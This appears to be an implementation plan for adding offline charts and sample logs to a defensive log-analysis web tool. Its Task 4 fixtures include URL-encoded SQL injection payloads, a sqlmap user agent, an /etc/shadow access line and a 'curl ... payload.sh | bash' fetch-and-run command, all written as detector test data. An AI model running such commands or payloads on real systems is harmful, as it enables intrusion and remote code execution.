---
change: enhance-visual-reports-and-log-samples
design-doc: docs/superpowers/specs/2026-06-15-enhance-visual-reports-and-log-samples-design.md
base-ref: e0c45d3280ad0fbf8904ede96545f9447d0b3530
---

# Enhance Visual Reports And Log Samples Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build an offline local visual report with richer attack source and time charts, backed by representative bundled sample logs.

**Architecture:** Keep the Flask/static-JS app shape. Add renderer-neutral chart dataset builders in `app.js`, then integrate a local static chart renderer with accessible fallback summaries. Expand `samples/` with curated deterministic `.log` files derived from `access1.log` and compact auth/application scenarios.

**Tech Stack:** Python, Flask, pytest, static HTML/CSS/JavaScript, local browser verification, optional vendored ECharts or Chart.js static asset.

---

## File Structure

- Modify `logcheck/web_static/app.js`: chart dataset adapter, renderer isolation, fallback summaries, chart failure handling.
- Modify `logcheck/web_static/index.html`: add chart containers for rule and source-file contribution if missing; add local chart library script after renderer choice.
- Modify `logcheck/web_static/styles.css`: chart layout, fallback tables, responsive chart sizing.
- Create or modify `logcheck/web_static/vendor/echarts.min.js`: vendored static chart asset if ECharts is selected; use the equivalent chosen file path if the spike selects Chart.js instead.
- Create `worktmp/generate_access_samples.py`: deterministic scratch generator for access-log variants; keep it out of final runtime.
- Create curated files under `samples/`: final representative sample logs only.
- Modify `tests/test_samples.py`: sample analysis and chart-useful diversity assertions.
- Modify `tests/test_webapp.py`: `/api/samples` listing expectations and local passive behavior checks where applicable.
- Modify `tests/test_web_serialization.py` only if serialized fields need explicit coverage for chart data.
- Update `openspec/changes/enhance-visual-reports-and-log-samples/tasks.md` as tasks complete.

### Task 1: Renderer Spike And Decision

**Files:**
- Modify: `openspec/changes/enhance-visual-reports-and-log-samples/design.md`
- Modify: `docs/superpowers/specs/2026-06-15-enhance-visual-reports-and-log-samples-design.md`
- Modify: `openspec/changes/enhance-visual-reports-and-log-samples/tasks.md`
- Scratch only: `worktmp/chart-spike/`

- [ ] **Step 1: Create scratch directory**

Run:

```powershell
New-Item -ItemType Directory -Force worktmp\chart-spike
```

Expected: directory exists under `worktmp/chart-spike`.

- [ ] **Step 2: Compare renderer fit**

Use the existing local payload shape from `samples/access1.log`, `samples/auth.log`, `samples/app.log`, and `samples/incident.log`. Record the decision in both design docs as:

```markdown
### Renderer Decision From Build Spike

Selected renderer: ECharts.

Reason: standalone browser delivery, strong time/category charts, no React migration, and renderer-neutral adapter compatibility.

Rejected alternatives:
- Chart.js: acceptable fallback, but time axes require an extra local date adapter.
- Recharts/Nivo: React-oriented and out of scope for the static dashboard.
- Hand-built DOM bars only: useful fallback, but insufficient for the visual report upgrade.
```

If Chart.js wins during the spike, replace `Selected renderer` and reasons consistently in both files.

- [ ] **Step 3: Mark OpenSpec task 1.1 through 1.3 complete**

In `openspec/changes/enhance-visual-reports-and-log-samples/tasks.md`, change:

```markdown
- [ ] 1.1
- [ ] 1.2
- [ ] 1.3
```

to:

```markdown
- [x] 1.1
- [x] 1.2
- [x] 1.3
```

- [ ] **Step 4: Commit renderer decision**

Run:

```powershell
git add openspec/changes/enhance-visual-reports-and-log-samples/design.md docs/superpowers/specs/2026-06-15-enhance-visual-reports-and-log-samples-design.md openspec/changes/enhance-visual-reports-and-log-samples/tasks.md
git commit -m "docs: record visual report renderer decision"
```

Expected: commit succeeds.

### Task 2: Chart Dataset Adapter Tests

**Files:**
- Modify: `logcheck/web_static/app.js`
- Create: `tests/test_chart_data_adapter.py`

- [ ] **Step 1: Write failing extraction test**

Create `tests/test_chart_data_adapter.py` with a lightweight static check that confirms the frontend exposes dedicated adapter functions before implementation:

```python
from pathlib import Path


APP_JS = Path("logcheck/web_static/app.js")


def test_chart_dataset_adapter_functions_are_defined():
    source = APP_JS.read_text(encoding="utf-8")

    expected_functions = [
        "function buildChartDatasets(",
        "function buildSourceIpRows(",
        "function buildTimeBucketRows(",
        "function buildRuleRows(",
        "function buildSourceFileRows(",
        "function renderChartFallbackTable(",
    ]

    for function_name in expected_functions:
        assert function_name in source
```

- [ ] **Step 2: Run test and verify it fails**

Run:

```powershell
pytest tests/test_chart_data_adapter.py -q
```

Expected: FAIL because the listed functions do not exist yet.

- [ ] **Step 3: Add minimal adapter functions**

In `logcheck/web_static/app.js`, add these functions near the existing chart functions:

```javascript
const CHART_LIMIT = 6;

function buildChartDatasets(payload) {
  const findings = payload.findings || [];
  const summary = payload.summary || {};
  return {
    sourceIps: buildSourceIpRows(findings),
    timeBuckets: buildTimeBucketRows(findings),
    severities: chartSeverityDistribution(summary, findings),
    rules: buildRuleRows(findings),
    sourceFiles: buildSourceFileRows(findings),
  };
}

function buildSourceIpRows(findings) {
  const counts = new Map();
  for (const finding of findings) {
    const source = finding.source_address || "unknown";
    counts.set(source, (counts.get(source) || 0) + 1);
  }
  return sortedChartRows(counts).slice(0, CHART_LIMIT);
}

function buildTimeBucketRows(findings) {
  const counts = new Map();
  let unknown = 0;
  for (const finding of findings) {
    if (!finding.timestamp) {
      unknown += 1;
      continue;
    }
    const bucket = String(finding.timestamp).slice(0, 13) + ":00";
    counts.set(bucket, (counts.get(bucket) || 0) + 1);
  }
  const rows = sortedChartRows(counts, false).slice(0, CHART_LIMIT);
  if (unknown) {
    rows.push({ label: "Unknown time", value: unknown });
  }
  return rows;
}

function buildRuleRows(findings) {
  const counts = new Map();
  for (const finding of findings) {
    const rule = finding.rule_id || "unknown";
    counts.set(rule, (counts.get(rule) || 0) + 1);
  }
  return sortedChartRows(counts).slice(0, CHART_LIMIT);
}

function buildSourceFileRows(findings) {
  const counts = new Map();
  for (const finding of findings) {
    const source = finding.source_file || "unknown";
    counts.set(source, (counts.get(source) || 0) + 1);
  }
  return sortedChartRows(counts).slice(0, CHART_LIMIT);
}
```

Add or keep `renderChartFallbackTable` as described in Task 3.

- [ ] **Step 4: Run adapter static test**

Run:

```powershell
pytest tests/test_chart_data_adapter.py -q
```

Expected: PASS.

- [ ] **Step 5: Commit adapter skeleton**

Run:

```powershell
git add logcheck/web_static/app.js tests/test_chart_data_adapter.py
git commit -m "feat: add visual report chart dataset adapter"
```

Expected: commit succeeds.

### Task 3: Frontend Chart Rendering And Fallbacks

**Files:**
- Modify: `logcheck/web_static/index.html`
- Modify: `logcheck/web_static/app.js`
- Modify: `logcheck/web_static/styles.css`
- Create: `logcheck/web_static/vendor/echarts.min.js` or chosen equivalent
- Modify: `tests/test_webapp.py`

- [ ] **Step 1: Write failing dashboard structure test**

Add to `tests/test_webapp.py`:

```python
def test_dashboard_includes_expanded_visual_report_regions(tmp_path):
    client = make_app(tmp_path)

    response = client.get("/")
    html = response.get_data(as_text=True)

    assert "source-chart" in html
    assert "time-chart" in html
    assert "severity-chart" in html
    assert "rule-chart" in html
    assert "source-file-chart" in html
    assert "/vendor/" in html
```

- [ ] **Step 2: Run test and verify it fails**

Run:

```powershell
pytest tests/test_webapp.py::test_dashboard_includes_expanded_visual_report_regions -q
```

Expected: FAIL because `rule-chart`, `source-file-chart`, or vendor script are missing.

- [ ] **Step 3: Update HTML chart cards**

In `logcheck/web_static/index.html`, add a local vendor script before `/app.js` if the renderer needs one:

```html
<script src="/vendor/echarts.min.js" defer></script>
<script src="/app.js" defer></script>
```

Add chart cards in `#chart-grid`:

```html
<article class="chart-card" aria-labelledby="rule-chart-title">
  <h3 id="rule-chart-title">Rule distribution</h3>
  <div id="rule-chart" class="chart-body">
    <p class="empty-state">Run analysis to populate local charts.</p>
  </div>
</article>
<article class="chart-card" aria-labelledby="source-file-chart-title">
  <h3 id="source-file-chart-title">Source contribution</h3>
  <div id="source-file-chart" class="chart-body">
    <p class="empty-state">Run analysis to populate local charts.</p>
  </div>
</article>
```

- [ ] **Step 4: Add renderer fallback table**

In `app.js`, implement:

```javascript
function renderChartFallbackTable(container, rows, options = {}) {
  if (!rows.length) {
    container.innerHTML = `<p class="empty-state">${escapeHtml(options.empty || "No chart data available.")}</p>`;
    return;
  }
  const tableRows = rows
    .map((row) => `<tr><th scope="row">${escapeHtml(row.label)}</th><td>${escapeHtml(String(row.value))}</td></tr>`)
    .join("");
  container.innerHTML = `<table class="chart-fallback"><tbody>${tableRows}</tbody></table>`;
}
```

Then update `renderCharts(payload)` so it calls `buildChartDatasets(payload)` and renders the five chart regions, using fallback tables whenever `window.echarts` or the selected renderer is unavailable.

- [ ] **Step 5: Add responsive chart CSS**

In `styles.css`, add:

```css
.chart-body {
  min-height: 180px;
}

.chart-canvas {
  min-height: 180px;
  width: 100%;
}

.chart-fallback {
  width: 100%;
  border-collapse: collapse;
  font-size: 0.88rem;
}

.chart-fallback th,
.chart-fallback td {
  padding: 0.45rem 0;
  border-bottom: 1px solid var(--border-color, #d8dee8);
  text-align: left;
}

.chart-fallback td {
  text-align: right;
  font-variant-numeric: tabular-nums;
}
```

- [ ] **Step 6: Run dashboard structure test**

Run:

```powershell
pytest tests/test_webapp.py::test_dashboard_includes_expanded_visual_report_regions -q
```

Expected: PASS.

- [ ] **Step 7: Commit frontend rendering**

Run:

```powershell
git add logcheck/web_static/index.html logcheck/web_static/app.js logcheck/web_static/styles.css logcheck/web_static/vendor tests/test_webapp.py
git commit -m "feat: render offline visual report charts"
```

Expected: commit succeeds.

### Task 4: Curated Sample Logs

**Files:**
- Create: `worktmp/generate_access_samples.py`
- Create: `samples/access-visual-diverse.log`
- Create or modify: `samples/auth-visual.log`
- Create or modify: `samples/app-visual.log`
- Modify: `tests/test_samples.py`

- [ ] **Step 1: Write failing sample diversity test**

Add to `tests/test_samples.py`:

```python
def test_visual_access_sample_has_source_and_time_diversity():
    result = analyze_logs([Path("samples/access-visual-diverse.log")])
    findings = result.findings
    sources = {finding.source_address for finding in findings if finding.source_address}
    timestamps = {finding.timestamp for finding in findings if finding.timestamp}

    assert len(findings) >= 6
    assert len(sources) >= 3
    assert len(timestamps) >= 3
    assert any(finding.rule_id == "behavior.web_sql_injection" for finding in findings)
```

- [ ] **Step 2: Run test and verify it fails**

Run:

```powershell
pytest tests/test_samples.py::test_visual_access_sample_has_source_and_time_diversity -q
```

Expected: FAIL because `samples/access-visual-diverse.log` does not exist.

- [ ] **Step 3: Create deterministic generator under worktmp**

Create `worktmp/generate_access_samples.py`:

```python
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
OUTPUT = ROOT / "samples" / "access-visual-diverse.log"

SOURCES = ["172.17.0.1", "198.51.100.20", "203.0.113.44", "192.0.2.77"]
TIMES = [
    "01/Sep/2021:01:37:25 +0000",
    "01/Sep/2021:01:42:25 +0000",
    "01/Sep/2021:02:05:25 +0000",
    "01/Sep/2021:02:40:25 +0000",
]
PAYLOADS = [
    "/index.php?id=1%20and%20if(substr(database(),1,1)%20=%20%27s%27,1,(select%20table_name%20from%20information_schema.tables))",
    "/search.php?q=%27%20union%20select%201,2,3--",
    "/login.php?user=admin%27%20or%20%271%27=%271",
    "/product.php?id=5%20and%20sleep(3)",
]


def main() -> None:
    lines = []
    for index in range(12):
        source = SOURCES[index % len(SOURCES)]
        timestamp = TIMES[index % len(TIMES)]
        path = PAYLOADS[index % len(PAYLOADS)]
        status = 200 if index % 3 else 500
        size = 420 + index
        user_agent = "python-requests/2.31.0" if index % 2 else "sqlmap/1.7"
        lines.append(
            f'{source} - - [{timestamp}] "GET {path} HTTP/1.1" {status} {size} "-" "{user_agent}"'
        )
    OUTPUT.write_text("\n".join(lines) + "\n", encoding="utf-8")


if __name__ == "__main__":
    main()
```

- [ ] **Step 4: Generate curated access sample**

Run:

```powershell
python worktmp\generate_access_samples.py
```

Expected: `samples/access-visual-diverse.log` exists.

- [ ] **Step 5: Add compact auth and app visual samples**

Create `samples/auth-visual.log` with:

```text
Jun  2 10:00:01 ubuntu sshd[200]: Failed password for invalid user admin from 192.0.2.10 port 51234 ssh2
Jun  2 10:00:11 ubuntu sshd[200]: Failed password for invalid user admin from 192.0.2.10 port 51235 ssh2
Jun  2 10:00:21 ubuntu sshd[200]: Failed password for invalid user admin from 198.51.100.9 port 51236 ssh2
Jun  2 10:02:01 ubuntu sshd[201]: Accepted password for deploy from 203.0.113.8 port 50100 ssh2
Jun  2 10:04:01 ubuntu sudo: pam_unix(sudo:auth): authentication failure; user=root
```

Create `samples/app-visual.log` with:

```text
2026-06-02 10:04:00 WARN unauthorized access user=guest ip=198.51.100.7 path=/admin
2026-06-02 10:04:15 ERROR permission denied user=guest ip=198.51.100.7 path=/etc/shadow
2026-06-02 10:05:00 WARN command execution user=deploy ip=203.0.113.12 cmd="curl http://192.0.2.55/payload.sh | bash"
2026-06-02 10:06:00 INFO normal request user=alice ip=203.0.113.10 path=/home
```

- [ ] **Step 6: Run sample tests**

Run:

```powershell
pytest tests/test_samples.py -q
```

Expected: PASS.

- [ ] **Step 7: Commit sample logs**

Run:

```powershell
git add worktmp/generate_access_samples.py samples/access-visual-diverse.log samples/auth-visual.log samples/app-visual.log tests/test_samples.py
git commit -m "test: add visual report sample logs"
```

Expected: commit succeeds.

### Task 5: Sample Listing And Serialization Coverage

**Files:**
- Modify: `tests/test_webapp.py`
- Modify: `tests/test_web_serialization.py` only if needed

- [ ] **Step 1: Add sample listing assertion**

Update `test_samples_endpoint_lists_local_samples` or add a new test:

```python
def test_samples_endpoint_lists_visual_samples(tmp_path):
    sample_dir = tmp_path / "samples"
    sample_dir.mkdir()
    for name in ["access-visual-diverse.log", "auth-visual.log", "app-visual.log"]:
        (sample_dir / name).write_text("line\n", encoding="utf-8")
    app = create_app(sample_dir=sample_dir, upload_dir=tmp_path / "uploads")
    client = app.test_client()

    response = client.get("/api/samples")
    names = {sample["name"] for sample in response.get_json()["samples"]}

    assert {"access-visual-diverse.log", "auth-visual.log", "app-visual.log"}.issubset(names)
```

- [ ] **Step 2: Run sample listing test**

Run:

```powershell
pytest tests/test_webapp.py::test_samples_endpoint_lists_visual_samples -q
```

Expected: PASS.

- [ ] **Step 3: Run serialization tests**

Run:

```powershell
pytest tests/test_web_serialization.py -q
```

Expected: PASS. If serialized timestamps/source fields are missing, add a focused assertion to `tests/test_web_serialization.py` and update serialization minimally.

- [ ] **Step 4: Commit web coverage**

Run:

```powershell
git add tests/test_webapp.py tests/test_web_serialization.py
git commit -m "test: cover visual report sample listing"
```

Expected: commit succeeds.

### Task 6: Browser Verification And Task Completion

**Files:**
- Modify: `openspec/changes/enhance-visual-reports-and-log-samples/tasks.md`
- Optional create: `docs/superpowers/reports/2026-06-15-enhance-visual-reports-and-log-samples-build.md`

- [ ] **Step 1: Run backend-focused tests**

Run:

```powershell
pytest tests/test_samples.py tests/test_webapp.py tests/test_web_serialization.py tests/test_parsers.py -q
```

Expected: PASS.

- [ ] **Step 2: Start local Flask app**

Run:

```powershell
python -m logcheck.webapp
```

Expected: app listens on `http://127.0.0.1:8765`.

- [ ] **Step 3: Verify in browser**

Open `http://127.0.0.1:8765`, select the visual samples, run analysis, and verify:

- Source IP chart renders or fallback table shows multiple IPs.
- Time distribution chart renders or fallback table shows multiple buckets.
- Severity, rule, and source contribution regions are populated.
- No remote scan, exploit, block, external report, URL input, or domain action controls were added.
- Browser network requests for chart scripts are local paths only.

- [ ] **Step 4: Mark OpenSpec tasks complete**

Update `openspec/changes/enhance-visual-reports-and-log-samples/tasks.md` so completed tasks are `[x]`.

- [ ] **Step 5: Commit build completion**

Run:

```powershell
git add openspec/changes/enhance-visual-reports-and-log-samples/tasks.md docs/superpowers/reports
git commit -m "docs: record visual report build verification"
```

Expected: commit succeeds if a report file was created; otherwise commit only the task file.

## Self-Review

Spec coverage:

- `web-frontend` visual analytics: Tasks 2, 3, and 6.
- Local/passive/offline visualization: Tasks 1, 3, and 6.
- Renderer evaluation and isolation: Tasks 1 and 2.
- Representative sample logs: Tasks 4 and 5.
- Generated access variants from `access1.log` seed and `worktmp` temporary handling: Task 4.

No placeholders remain in the task instructions. Function names introduced in Task 2 are reused consistently in Task 3.
